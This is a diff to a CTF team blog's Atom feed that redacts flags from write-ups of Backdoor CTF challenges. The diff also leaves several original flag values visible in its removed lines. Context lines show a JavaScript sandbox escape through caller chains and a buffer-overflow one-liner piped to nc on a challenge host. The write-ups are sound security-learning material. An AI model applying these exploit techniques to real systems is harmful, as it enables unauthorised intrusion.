@@ -4,7 +4,7 @@
   <title><![CDATA[GeeksSpeak Team Blog]]></title>
   <link href="http://geeksspeak.github.io/atom.xml" rel="self"/>
   <link href="http://geeksspeak.github.io/"/>
-  <updated>2015-04-03T03:20:34+04:30</updated>
+  <updated>2015-04-03T19:00:38+04:30</updated>
   <id>http://geeksspeak.github.io/</id>
   <author>
     <name><![CDATA[GeeksSpeak]]></name>
@@ -167,7 +167,7 @@
 <p>is our flag. using python <code>struct</code> module for all gives us this one:</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>d3f5106d91e77a42be5805acd58a1b8dad11af78fcc5f381c2df5636953571fb</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[redacted]</span></code></pre></td></tr></table></div></figure>
 
 
 <p>which added 600pts to our points.</p>
@@ -407,7 +407,7 @@ Recently, Lua started to annoy Fawkes. To this, Fawkes, challenged Lua to a batt
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 </pre></td><td class='code'><pre><code class='python'><span class='line'><span class="err">$</span> <span class="n">python</span> <span class="n">sol</span><span class="o">.</span><span class="n">py</span>
-</span><span class='line'><span class="n">ebe2c4abf85c239c7bd0385a685c460b2c5fe1dcdb2236f87dfef826bb690adf</span>
+</span><span class='line'><span class="p">[</span><span class="n">redacted</span><span class="p">]</span>
 </span><span class='line'><span class="o">***</span> <span class="n">Connection</span> <span class="n">closed</span> <span class="n">by</span> <span class="n">remote</span> <span class="n">host</span> <span class="o">***</span>
 </span></code></pre></td></tr></table></div></figure>
 
@@ -519,7 +519,7 @@ Recently, Lua started to annoy Fawkes. To this, Fawkes, challenged Lua to a batt
 </pre></td><td class='code'><pre><code class=''><span class='line'>home@jail:$ function exploit() { return ((((((((exploit.caller).caller).caller).caller).caller).caller).caller).caller).caller.toString(); }
 </span><span class='line'>function (err, line) {
 </span><span class='line'>
-</span><span class='line'>    // flag : 50_y0u_f1n4lly_f0und_17
+</span><span class='line'>    // flag : [redacted]
 </span><span class='line'>
 </span><span class='line'>    if (err && wait === false) {
 </span><span class='line'>      return callback(err);
@@ -534,7 +534,7 @@ Recently, Lua started to annoy Fawkes. To this, Fawkes, challenged Lua to a batt
 </span><span class='line'>      [..stripped..]</span></code></pre></td></tr></table></div></figure>
 
 
-<p>and sha256 of the <code>50_y0u_f1n4lly_f0und_17</code> gives us another 150pts.</p>
+<p>and sha256 of the <code>[redacted]</code> gives us another 150pts.</p>
 
 <p>HAMIDx9</p>
 ]]></content>
@@ -685,7 +685,7 @@ Recently, Lua started to annoy Fawkes. To this, Fawkes, challenged Lua to a batt
 <span class='line-number'>3</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'import struct; q=lambda x: struct.pack("&lt;I", x); print "A"*62+q(0x0804854d)' | nc hack.bckdr.in 8002
 </span><span class='line'>ECHO: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM�
-</span><span class='line'>96f674623c2c378f89700aa46f02cf3b311489f0facdfac6fd5885d5bc1a129a</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>[redacted]</span></code></pre></td></tr></table></div></figure>
 
 
 <p>And another 100 pt.</p>
@@ -783,7 +783,7 @@ Server.php</p>
 
 <blockquote><p>we have Referer Link in flag.txt :D</p></blockquote>
 
-<p><a href="http://hack.bckdr.in/MEDUSA/view.php?flag=6bbaf4e1d3af423dd6c5a03c21c2a35c075392861709f2e896a27ae1f57d30c5&amp;id=d61d051c6e741595491c">Referer Link With Flag!</a></p>
+<p><a href="http://hack.bckdr.in/MEDUSA/view.php?flag=[redacted]&amp;id=d61d051c6e741595491c">Referer Link With Flag!</a></p>
 
 <p>and now you have 100 point :D</p>
 
@@ -884,11 +884,11 @@ found this <a href="http://christophermaier.name/blog/2011/04/30/not-so-private-
 <p>and its the first part of the flag :</p>
 
 <blockquote><p>(#&lsquo;noname.people.admin/secret)
-&ldquo;Ma secret is: 1_4m_50_cl0jur3d_y0u_c4n7_3v3n_7h1nk&rdquo;</p>
+&ldquo;Ma secret is: [redacted]&rdquo;</p>
 
 <p>Flag Format = sha256(secret+flag)
-sha256(1_4m_50_cl0jur3d_y0u_c4n7_3v3n_7h1nk_b7w_1_l1k3_60l4n6_700)
-<strong>147fadb708195779c6414a0ce9171bc4b966e03a9818383eabafa0e71a240d5a</strong></p></blockquote>
+sha256(1_4m_50..[FILTERED]..1k3_60l4n6_700)
+<strong>[redacted]</strong></p></blockquote>
 
 <p>200 points ;)</p>
 
